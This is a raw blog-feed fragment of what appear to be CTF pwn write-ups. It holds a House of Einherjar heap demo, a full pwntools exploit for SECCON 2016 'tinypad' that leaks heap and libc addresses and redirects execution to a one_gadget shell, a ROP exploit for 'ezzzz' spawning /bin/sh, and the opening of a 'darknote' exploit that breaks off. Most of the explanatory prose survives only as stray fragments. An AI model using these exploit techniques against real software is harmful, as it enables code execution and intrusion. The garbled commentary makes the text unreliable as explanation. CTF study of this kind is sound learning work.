class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="comment">//free cbunsortedbin</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">  <span class="comment">//db</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// tcache poisoning</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">  <span class="comment">// tcache_index&lt;0</span></span><br><span class="line">  <span class="type">uint8_t</span>* pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">  <span class="comment">//tcacheb</span></span><br><span class="line">  d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// take target out</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert(e == stack_var);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tcache poisoning bcprevsizeprevinusefakechunkafreecunlink bunsortedbin</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730223649416.png" alt="image-20230730223649416"></p><p>intptr_t* d &#x3D; malloc(0x158);bdfreebtcache</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730224051202.png" alt="image-20230730224051202"></p><p>db</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730224245777.png" alt="image-20230730224245777"></p><p></p><h2 id="2016-Seccon-tinypad"><a href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h2><p>libc 2.23</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/m/h/s/c/p/h/<span class="number">2016</span>_seccon_tinypad&gt; checksec tinypad </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/share/ctfwiki/pwn/heap/2016_seccon_tinypad/tinypad&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><p>read_untiloff by one</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">read_until</span><span class="params">(<span class="type">char</span> *a1, <span class="type">unsigned</span> __int64 len, <span class="type">int</span> <span class="built_in">terminate</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  __int64 n; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    n = read_n(<span class="number">0LL</span>, &amp;a1[i], <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( n &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !n || a1[i] == <span class="built_in">terminate</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( i == len &amp;&amp; a1[len - <span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    dummyinput(<span class="built_in">terminate</span>);</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>deleteuaf</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(*(<span class="type">void</span> **)&amp;tinypad[<span class="number">16</span> * idx + <span class="number">248</span>]);</span><br><span class="line">*(_QWORD *)&amp;tinypad[<span class="number">16</span> * idx + <span class="number">240</span>] = <span class="number">0LL</span>;</span><br><span class="line">writeln(<span class="string">&quot;\nDeleted.&quot;</span>, <span class="number">9uLL</span>);</span><br></pre></td></tr></table></figure><p>uaflibcheapbaseoff by one 2.31how2heapedittinypad+256fastbintinypad+256editfree mallochookenvironmainogg</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./tinypad&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(SIZE)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Is it OK?\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400B55&#x27;)# add readuntil</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400C12&#x27;)#delete free</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x040098C&#x27;)#menu show</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x00400E17&#x27;)#edit</span></span><br><span class="line"><span class="comment">#leak heapbase</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">b&#x27;#   INDEX: 3\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;# CONTENT: &#x27;</span>)</span><br><span class="line">heapbase=uu64(r(<span class="number">4</span>))-<span class="number">0x30</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#leak libcbase</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;#   INDEX: 1\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;# CONTENT: &#x27;</span>)</span><br><span class="line">libcbase=uu64(r(<span class="number">6</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;heapbase&#x27;</span>,heapbase)</span><br><span class="line">system=libcelf.sym[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line">free_hook=libcelf.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+libcbase</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">chun1=heapbase</span><br><span class="line">chun2=heapbase+<span class="number">0x30</span></span><br><span class="line">chun3=heapbase+<span class="number">0x60</span></span><br><span class="line">add(<span class="number">0x28</span>,flat(<span class="number">0</span>,<span class="number">0x20</span>,chun1+<span class="number">0x10</span>,chun1+<span class="number">0x10</span>,<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x28</span>-i))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span>+p64(chun3-chun1-<span class="number">0x10</span>))</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400C12&#x27;)#delete free</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">256</span>+<span class="number">0x0602040</span>-<span class="number">8</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x31</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)<span class="comment">#fastbin</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400B55&#x27;)# add readuntil</span></span><br><span class="line">enviorn=libcbase+libcelf.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">add(<span class="number">0x20</span>,flat(enviorn,<span class="number">0x31</span>,<span class="number">256</span>+<span class="number">0x0602040</span>+<span class="number">8</span>))</span><br><span class="line">ru(<span class="string">b&#x27;#   INDEX: 1\n&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;# CONTENT: &#x27;</span>)</span><br><span class="line">main_ret=uu64(r(<span class="number">6</span>))-(<span class="number">0x7ffebf17a478</span>-<span class="number">0x7ffebf17a388</span>)</span><br><span class="line">p(<span class="string">&#x27;ret&#x27;</span>,main_ret)</span><br><span class="line">ogg=libcbase+<span class="number">0x45226</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,p64(main_ret))</span><br><span class="line">edit(<span class="number">1</span>,p64(ogg))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>wpedittinypadtinypadfakechunkhouse of ejinherjartinypadtinypad+0x20fakechunk0x100</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023  pwn</title>
      <link href="/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/"/>
      <url>/2023/07/25/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap"></a>linkmap</h2><p>main</p><p>roppergadget</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000040066b: lea rdx, [rax + 0x601020]; mov rax, qword ptr [rbp - 8]; mov qword ptr [rdx], rax; nop; pop rbp; ret; </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000000000040076</span>D B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000400772</span> C9                            leave</span><br><span class="line">.text:<span class="number">0000000000400773</span> C3                            retn</span><br></pre></td></tr></table></figure><p>mainmov eax0gadgetrbp - 80x601020 .bss</p><ul><li><p>readgot0x601020</p></li><li><p>bssread0x90 syscall</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble read</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function __GI___libc_read:</span><br><span class="line">   <span class="number">0x00007fb1a3514980</span> &lt;+<span class="number">0</span>&gt;:     endbr64</span><br><span class="line">   <span class="number">0x00007fb1a3514984</span> &lt;+<span class="number">4</span>&gt;:     mov    eax,DWORD PTR fs:<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x00007fb1a351498c</span> &lt;+<span class="number">12</span>&gt;:    test   eax,eax</span><br><span class="line">   <span class="number">0x00007fb1a351498e</span> &lt;+<span class="number">14</span>&gt;:    jne    <span class="number">0x7fb1a35149a0</span> &lt;__GI___libc_read+<span class="number">32</span>&gt;</span><br><span class="line">   <span class="number">0x00007fb1a3514990</span> &lt;+<span class="number">16</span>&gt;:    syscall</span><br></pre></td></tr></table></figure></li><li><p>gadget0x3Bsys_execve</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./ezzzz&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x0400772&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x0400768&#x27;)</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x0400570</span></span><br><span class="line">pop_rdi=<span class="number">0x04007e3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x04007e1</span></span><br><span class="line">leave_ret=<span class="number">0x0400712</span></span><br><span class="line">bss_data=<span class="number">0x601020</span></span><br><span class="line">gadget=<span class="number">0x000000000040066b</span> <span class="comment">#0x000000000040066b: lea rdx, [rax + 0x601020]; mov rax, qword ptr [rbp - 8]; mov qword ptr [rdx], rax; nop; pop rbp; ret; </span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">binsh=bss_data+<span class="number">100</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload=flat(padding,pop_rbp_ret,read_got+<span class="number">8</span>,gadget,<span class="number">0</span>)<span class="comment">#readbss</span></span><br><span class="line">payload+=flat(pop_rdi,<span class="number">0</span>,pop_rsi_r15,bss_data,<span class="number">0</span>,read_plt)<span class="comment">#0x90</span></span><br><span class="line">payload+=flat(pop_rdi,<span class="number">0</span>,pop_rsi_r15,binsh,<span class="number">0</span>,read_plt)<span class="comment">#binsh</span></span><br><span class="line">payload+=flat(pop_rdi,binsh,pop_rsi_r15,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">rop.migrate(bss_data)<span class="comment">#bss_datarop</span></span><br><span class="line">payload+=rop.chain()</span><br><span class="line">s(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">s(<span class="string">b&#x27;\x90&#x27;</span>)<span class="comment">#0x90</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x3b</span>-<span class="number">8</span>))<span class="comment">#eaxexecve0x3b</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><code> syscall  &lt;SYS_execve&gt;</code>rsi0rdx</p><p>csugadgetsyscall</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004007C0 4C 89 EA                      mov     rdx, r13</span><br><span class="line">.text:00000000004007C3 4C 89 F6                      mov     rsi, r14</span><br><span class="line">.text:00000000004007C6 44 89 FF                      mov     edi, r15d</span><br><span class="line">.text:00000000004007C9 41 FF 14 DC                   call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004007C9</span><br><span class="line">.text:00000000004007CD 48 83 C3 01                   add     rbx, 1</span><br><span class="line">.text:00000000004007D1 48 39 EB                      cmp     rbx, rbp</span><br><span class="line">.text:00000000004007D4 75 EA                         jnz     short loc_4007C0</span><br><span class="line">.text:00000000004007D4</span><br><span class="line">.text:00000000004007D6</span><br><span class="line">.text:00000000004007D6                               loc_4007D6:                             ; CODE XREF: init+34j</span><br><span class="line">.text:00000000004007D6 48 83 C4 08                   add     rsp, 8</span><br><span class="line">.text:00000000004007DA 5B                            pop     rbx</span><br><span class="line">.text:00000000004007DB 5D                            pop     rbp</span><br><span class="line">.text:00000000004007DC 41 5C                         pop     r12</span><br><span class="line">.text:00000000004007DE 41 5D                         pop     r13</span><br><span class="line">.text:00000000004007E0 41 5E                         pop     r14</span><br><span class="line">.text:00000000004007E2 41 5F                         pop     r15</span><br><span class="line">.text:00000000004007E4 C3                            retn</span><br></pre></td></tr></table></figure><h3 id="darknote"><a href="#darknote" class="headerlink" title="darknote"></a>darknote</h3><p>addcanary0</p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;How many dark notes do you want?&quot;</span>);</span><br><span class="line">note_count = ((__int64 (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> **))read_num)(<span class="string">&quot;How many dark notes do you want?&quot;</span>, a2);</span><br><span class="line">note_ptr_ar = <span class="built_in">malloc</span>(<span class="number">8</span> * note_count);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">index_add = ((__int64 (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *, _BYTE *))read_num)(<span class="string">&quot;Index: &quot;</span>, v3);</span><br><span class="line"><span class="keyword">if</span> ( index_add &gt;= <span class="number">0</span> &amp;&amp; index_add &lt; note_count )</span><br><span class="line">&#123;</span><br><span class="line">    v6 = (<span class="type">void</span> **)((<span class="type">char</span> *)note_ptr_ar + <span class="number">8</span> * index_add);</span><br><span class="line">    *v6 = <span class="built_in">malloc</span>(<span class="number">0x68</span>uLL);</span><br></pre></td></tr></table></figure><p>note_count*8<code> v6 = (void **)((char *)note_ptr_ar + 8 * index_add); *v6 = malloc(0x68uLL);</code>mmaplibclibc</p><p></p><ul><li> main_arena.fastbin[5]</li><li>libc</li><li>__environstack</li><li>stackrop</li><li>malloc_hookropgadget</li></ul><p>fd+0x100</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./darknote&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x 